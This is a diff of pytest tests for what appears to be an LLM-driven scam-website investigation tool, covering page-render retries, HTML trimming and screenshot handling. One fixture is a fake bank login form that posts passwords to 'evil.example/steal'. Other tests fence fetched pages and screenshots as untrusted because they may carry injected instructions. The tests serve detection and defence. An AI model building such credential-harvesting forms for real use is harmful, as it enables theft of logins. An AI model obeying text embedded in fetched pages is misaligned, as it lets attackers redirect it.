@@ -252,3 +252,278 @@ class TestTrimHtmlBudget:
             for _ in range(6)
         )
         assert len(trim_html(html)) < 1200
+
+
+def _timeout_error():
+    import httpx
+
+    request = httpx.Request("POST", "https://api.cloudflare.com/x")
+    response = httpx.Response(422, text='{"errors":[{"code":6002}]}', request=request)
+    return httpx.HTTPStatusError("422", request=request, response=response)
+
+
+class TestWaitLadder:
+    """networkidle0 demands zero in-flight requests, so a live page with an
+    analytics beacon times out. Measured on nauratimm.net: dead on the first
+    condition, 88KB on the second. One flaky wait must not become a verdict."""
+
+    @staticmethod
+    def _http(fail_first: int):
+        import base64
+
+        calls = {"n": 0}
+
+        async def post(*args, **kwargs):
+            calls["n"] += 1
+            if calls["n"] <= fail_first:
+                raise _timeout_error()
+            return SimpleNamespace(
+                raise_for_status=lambda: None,
+                json=lambda: {
+                    "result": {
+                        "content": "<title>Naura Timm</title>",
+                        "screenshot": base64.b64encode(b"shot").decode(),
+                    }
+                },
+            )
+
+        http = AsyncMock()
+        http.post = post
+        return http, calls
+
+    @pytest.mark.asyncio
+    async def test_second_condition_recovers_the_page(self):
+        http, calls = self._http(fail_first=1)
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+
+        result = await client.snapshot("https://nauratimm.net/")
+
+        assert result is not None
+        assert result.html == "<title>Naura Timm</title>"
+        assert calls["n"] == 2
+
+    @staticmethod
+    def _recording_http(fail_first: int):
+        """Same as _http but keeps every gotoOptions the client sent."""
+        import base64
+
+        sent: list[str] = []
+
+        async def post(*args, **kwargs):
+            sent.append(kwargs["json"]["gotoOptions"]["waitUntil"])
+            if len(sent) <= fail_first:
+                raise _timeout_error()
+            return SimpleNamespace(
+                raise_for_status=lambda: None,
+                json=lambda: {
+                    "result": {
+                        "content": "<title>ok</title>",
+                        "screenshot": base64.b64encode(b"shot").decode(),
+                    }
+                },
+            )
+
+        http = AsyncMock()
+        http.post = post
+        return http, sent
+
+    @pytest.mark.asyncio
+    async def test_networkidle0_is_never_requested(self):
+        """It is the condition that fails on live pages, so it is gone."""
+        http, sent = self._recording_http(fail_first=99)
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+
+        await client.snapshot("https://x.example")
+
+        assert sent == ["networkidle2", "domcontentloaded"]
+
+    @pytest.mark.asyncio
+    async def test_a_first_try_success_never_reaches_the_fallback(self):
+        http, sent = self._recording_http(fail_first=0)
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+
+        assert await client.snapshot("https://x.example") is not None
+        assert sent == ["networkidle2"]
+
+    @pytest.mark.asyncio
+    async def test_every_condition_failing_is_still_absent_evidence(self):
+        http, calls = self._http(fail_first=99)
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+
+        assert await client.snapshot("https://dg-bbs.com/") is None
+        assert calls["n"] == 2
+
+
+class TestEmbeddedAndChallenge:
+    def test_frameset_target_is_surfaced(self):
+        """edanmed.com is 340 bytes of frameset. Without this the model is
+        told "no content" while the HTML names where the content lives."""
+        html = (
+            "<html><head><title>EDANMED.COM</title></head>"
+            '<frameset rows="100%,*"><frame src="http://www.edanusa.com">'
+            "</frameset></html>"
+        )
+        out = trim_html(html)
+        assert "embedded destinations: frame src=http://www.edanusa.com" in out
+
+    def test_meta_refresh_target_is_surfaced(self):
+        html = (
+            '<html><head><meta http-equiv="refresh" '
+            'content="0;url=https://evil.example/login"></head></html>'
+        )
+        assert "meta refresh=0;url=https://evil.example/login" in trim_html(html)
+
+    def test_bot_challenge_is_named_as_missing_evidence(self):
+        """kisalt.com renders 27KB of this and nothing of the actual site."""
+        html = (
+            "<html><head><title>Just a moment...</title></head>"
+            "<body>Enable JavaScript and cookies to continue</body></html>"
+        )
+        out = trim_html(html)
+        assert "anti-bot challenge markers" in out
+        assert "MISSING evidence" in out
+
+    def test_challenge_words_on_a_page_with_a_form_do_not_discount_it(self):
+        """The markers are attacker-controlled text. A scam page that hides
+        "verifying you are human" in a corner still shows its credential
+        form and must stay judgeable, not be talked down to uncertain."""
+        html = (
+            "<html><head><title>Bank Login</title></head><body>"
+            '<form action="https://evil.example/steal"><input type="password" name="pw"></form>'
+            "<p>Enter your details to continue.</p>"
+            "<small>verifying you are human</small></body></html>"
+        )
+        out = trim_html(html)
+        assert "challenge" not in out
+        assert "password:pw" in out
+
+    def test_an_ordinary_page_is_not_called_a_challenge(self):
+        html = "<html><head><title>Naura Timm</title></head><body>Obras</body></html>"
+        out = trim_html(html)
+        assert "challenge" not in out
+        assert "embedded destinations: none" in out
+
+
+class TestScreenshotReachesTheModel:
+    @pytest.mark.asyncio
+    async def test_screenshot_rides_along_as_image_content(self):
+        from pydantic_ai.messages import BinaryContent, ToolReturn
+
+        deps = _deps()
+        deps.browser.snapshot = AsyncMock(
+            return_value=RenderResult(
+                url="https://x.example", html="<title>Hi</title>", screenshot=b"webp!"
+            )
+        )
+        fetch_page = next(
+            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
+        )
+
+        out = await fetch_page("https://x.example")
+
+        assert isinstance(out, ToolReturn)
+        assert len(out.content) == 1
+        image = out.content[0]
+        assert isinstance(image, BinaryContent)
+        assert image.data == b"webp!"
+        assert image.media_type == "image/webp"
+
+    @pytest.mark.asyncio
+    async def test_the_fence_covers_the_image_too(self):
+        """A screenshot can carry instruction-shaped text as easily as
+        markup can, so the untrusted fence has to name it."""
+        from pydantic_ai.messages import ToolReturn
+
+        deps = _deps()
+        deps.browser.snapshot = AsyncMock(
+            return_value=RenderResult(
+                url="https://x.example", html="<title>Hi</title>", screenshot=b"webp!"
+            )
+        )
+        fetch_page = next(
+            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
+        )
+
+        out = await fetch_page("https://x.example")
+
+        assert isinstance(out, ToolReturn)
+        assert "attached screenshot is UNTRUSTED" in out.return_value
+        assert "title: Hi" in out.return_value
+
+    @pytest.mark.asyncio
+    async def test_no_screenshot_stays_a_plain_string(self):
+        deps = _deps()
+        deps.browser.snapshot = AsyncMock(
+            return_value=RenderResult(
+                url="https://x.example", html="<title>Hi</title>", screenshot=b""
+            )
+        )
+        fetch_page = next(
+            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
+        )
+
+        out = await fetch_page("https://x.example")
+
+        assert isinstance(out, str)
+
+
+class TestRenderEdgeCases:
+    @pytest.mark.asyncio
+    async def test_empty_content_and_empty_screenshot_is_absent_evidence(self):
+        http = AsyncMock()
+        http.post = AsyncMock(
+            return_value=SimpleNamespace(
+                raise_for_status=lambda: None,
+                json=lambda: {"result": {"content": "", "screenshot": ""}},
+            )
+        )
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+        assert await client.snapshot("https://x.example") is None
+
+    def test_embedded_destinations_are_capped(self):
+        frames = "".join(
+            f'<iframe src="https://f{i}.example/"></iframe>' for i in range(6)
+        )
+        out = trim_html(f"<html><body>{frames}</body></html>")
+        assert "iframe src=https://f3.example/" in out
+        assert "(+2 more)" in out
+
+
+class TestRetryOnlyOnWaitTimeout:
+    """A dead host fails identically under every wait condition, so a second
+    Browser Run call for it is pure cost. Only a 6002 goto timeout earns the
+    next rung of the ladder."""
+
+    @staticmethod
+    def _http(error_text: str):
+        import httpx
+
+        calls = {"n": 0}
+
+        async def post(*args, **kwargs):
+            calls["n"] += 1
+            request = httpx.Request("POST", "https://api.cloudflare.com/x")
+            response = httpx.Response(422, text=error_text, request=request)
+            raise httpx.HTTPStatusError("422", request=request, response=response)
+
+        http = AsyncMock()
+        http.post = post
+        return http, calls
+
+    @pytest.mark.asyncio
+    async def test_dead_host_is_not_retried(self):
+        http, calls = self._http(
+            '{"errors":[{"code":5006,"message":"Network connection closed."}]}'
+        )
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+        assert await client.snapshot("https://dg-bbs.com/") is None
+        assert calls["n"] == 1
+
+    @pytest.mark.asyncio
+    async def test_wait_timeout_earns_the_next_rung(self):
+        http, calls = self._http(
+            '{"errors":[{"code":6002,"message":"A timeout was reached."}]}'
+        )
+        client = BrowserRunClient(http, account_id="acc", api_token="tok")
+        assert await client.snapshot("https://nauratimm.net/") is None
+        assert calls["n"] == 2
